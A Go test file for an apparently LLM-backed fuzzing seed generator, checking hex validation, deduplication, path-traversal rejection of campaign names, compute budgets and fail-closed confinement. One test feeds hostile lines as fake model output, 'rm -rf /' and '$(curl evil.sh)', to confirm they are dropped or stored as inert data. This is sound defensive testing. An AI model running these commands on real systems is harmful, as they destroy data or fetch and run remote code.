// SPDX-License-Identifier: GPL-3.0-or-later
// Copyright (c) 2024-2026 Stevie Bellis.

package lichtools

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// twentyHex is a valid 20-byte Monad-wire seed line.
func twentyHex(fill byte) string {
	parts := make([]string, MonadWireLen)
	for i := range parts {
		parts[i] = string("0123456789abcdef"[fill>>4]) + string("0123456789abcdef"[fill&0xf])
	}
	return strings.Join(parts, " ")
}

func TestSeedGen_WritesValidDedupedInScope(t *testing.T) {
	v1 := twentyHex(0x01)
	v2 := twentyHex(0x02)
	reply := strings.Join([]string{
		v1,               // valid
		v2,               // valid
		v1,               // duplicate of v1
		"a1 b2 c3",       // too short for monad-wire (dropped)
		"not hex at all", // not a seed (dropped, not parsed)
		"",               // blank
	}, "\n")
	srv, _ := fakeLlama(t, reply)
	p := providerWithLocal(t, srv.URL, 0)

	res, err := p.GenerateSeeds(context.Background(), SeedSpec{
		Campaign: "lich_001_monad_wire", Format: FormatMonadWire, Count: 8,
	})
	if err != nil {
		t.Fatalf("GenerateSeeds: %v", err)
	}
	if res.Written != 2 {
		t.Fatalf("written = %d, want 2 unique valid seeds", res.Written)
	}
	if res.Duplicates < 1 {
		t.Fatalf("duplicates = %d, want >=1", res.Duplicates)
	}
	if res.Dropped < 1 {
		t.Fatalf("dropped = %d, want >=1 (short seed)", res.Dropped)
	}
	// Seeds landed under the campaign dir only, and are exactly 20 bytes.
	for _, name := range res.Files {
		path := filepath.Join(res.Dir, name)
		b, rerr := os.ReadFile(path)
		if rerr != nil {
			t.Fatalf("read seed %s: %v", name, rerr)
		}
		if len(b) != MonadWireLen {
			t.Fatalf("seed %s is %d bytes, want %d", name, len(b), MonadWireLen)
		}
		if !strings.HasPrefix(path, res.Dir+string(os.PathSeparator)) {
			t.Fatalf("seed %s written outside the campaign dir", path)
		}
	}
}

func TestSeedGen_RejectsCampaignTraversal(t *testing.T) {
	srv, _ := fakeLlama(t, twentyHex(0x01))
	p := providerWithLocal(t, srv.URL, 0)
	for _, bad := range []string{"../evil", "a/b", "..", "LICH-001", "x\x00y"} {
		if _, err := p.GenerateSeeds(context.Background(), SeedSpec{Campaign: bad, Format: FormatBytes}); !errors.Is(err, ErrSeedScope) {
			t.Fatalf("campaign %q err = %v, want ErrSeedScope", bad, err)
		}
	}
}

// Step 137: a seed is inert data, never code. A line that is a shell command is
// not hex, so it is dropped — it never reaches disk as an executable and is
// never run. A hex line whose BYTES spell a command is written as a literal
// data file (never executed), proving seeds are bytes a parser reads.
func TestSeedGen_SeedsAreInertData(t *testing.T) {
	// "rm -rf /" as hex bytes: 72 6d 20 2d 72 66 20 2f
	cmdAsHex := "72 6d 20 2d 72 66 20 2f"
	reply := strings.Join([]string{
		"rm -rf /",        // a literal shell command: NOT hex -> dropped, never stored
		"$(curl evil.sh)", // injection attempt: NOT hex -> dropped
		cmdAsHex,          // hex bytes that happen to spell a command -> stored as data
	}, "\n")
	srv, _ := fakeLlama(t, reply)
	p := providerWithLocal(t, srv.URL, 0)

	res, err := p.GenerateSeeds(context.Background(), SeedSpec{Campaign: "lich_099_adversarial", Format: FormatBytes})
	if err != nil {
		t.Fatalf("GenerateSeeds: %v", err)
	}
	if res.Written != 1 {
		t.Fatalf("written = %d, want 1 (only the hex line is a seed)", res.Written)
	}
	// The stored seed is the literal bytes, mode 0600, under the seed dir — a
	// data file, not an executable.
	path := filepath.Join(res.Dir, res.Files[0])
	b, _ := os.ReadFile(path)
	if string(b) != "rm -rf /" {
		t.Fatalf("seed content = %q, want the literal decoded bytes", string(b))
	}
	info, _ := os.Stat(path)
	if info.Mode().Perm()&0o111 != 0 {
		t.Fatalf("seed file is executable (mode %v); seeds must be inert data", info.Mode())
	}
}

func TestSeedGen_BudgetResetsNextDay(t *testing.T) {
	srv, _ := fakeLlama(t, twentyHex(0x01))
	p := providerWithLocal(t, srv.URL, 1)
	if _, err := p.GenerateSeeds(context.Background(), SeedSpec{Campaign: "lich_001_monad_wire", Format: FormatMonadWire}); err != nil {
		t.Fatalf("day-1 batch: %v", err)
	}
	// Exhausted for today.
	if _, err := p.GenerateSeeds(context.Background(), SeedSpec{Campaign: "lich_001_monad_wire", Format: FormatMonadWire}); !errors.Is(err, ErrComputeBudget) {
		t.Fatalf("day-1 second batch err = %v, want ErrComputeBudget", err)
	}
	// Roll the budget's day marker forward; the budget resets.
	p.genMu.Lock()
	p.genDay = "2000-01-01"
	p.genMu.Unlock()
	if _, err := p.GenerateSeeds(context.Background(), SeedSpec{Campaign: "lich_001_monad_wire", Format: FormatMonadWire}); err != nil {
		t.Fatalf("next-day batch should succeed after reset: %v", err)
	}
}

func TestGenerateRunCollect_GeneratesThenRunsConfined(t *testing.T) {
	srv, _ := fakeLlama(t, twentyHex(0x01)+"\n"+twentyHex(0x02))
	p := providerWithLocal(t, srv.URL, 0)
	// Make harness 001 pass scope: a file lich_001_* under the harness dir.
	hf := filepath.Join(p.scope.HarnessDir(), "lich_001_demo_test.go")
	if err := os.WriteFile(hf, []byte("package x\n"), 0o600); err != nil {
		t.Fatalf("write harness fixture: %v", err)
	}

	// No confinement substrate wired → the run side fails CLOSED (never runs
	// unconfined), but the seeds are still generated and reported.
	out, err := p.GenerateRunCollect(context.Background(), SeedSpec{Campaign: "lich_001_monad_wire", Format: FormatMonadWire, Count: 2}, "001", 10)
	if err != nil {
		t.Fatalf("GenerateRunCollect: %v", err)
	}
	if out.Seeds.Written != 2 {
		t.Fatalf("seeds written = %d, want 2", out.Seeds.Written)
	}
	if out.RunError == "" || !strings.Contains(out.RunError, "confinement") {
		t.Fatalf("run side = %q/%q, want a fail-closed confinement error", out.RunText, out.RunError)
	}
}

func TestSeedGen_ComputeBudgetPauses(t *testing.T) {
	srv, _ := fakeLlama(t, twentyHex(0x01))
	p := providerWithLocal(t, srv.URL, 1) // one generation allowed

	if _, err := p.GenerateSeeds(context.Background(), SeedSpec{Campaign: "lich_001_monad_wire", Format: FormatMonadWire}); err != nil {
		t.Fatalf("first batch: %v", err)
	}
	if _, err := p.GenerateSeeds(context.Background(), SeedSpec{Campaign: "lich_001_monad_wire", Format: FormatMonadWire}); !errors.Is(err, ErrComputeBudget) {
		t.Fatalf("second batch err = %v, want ErrComputeBudget", err)
	}
}
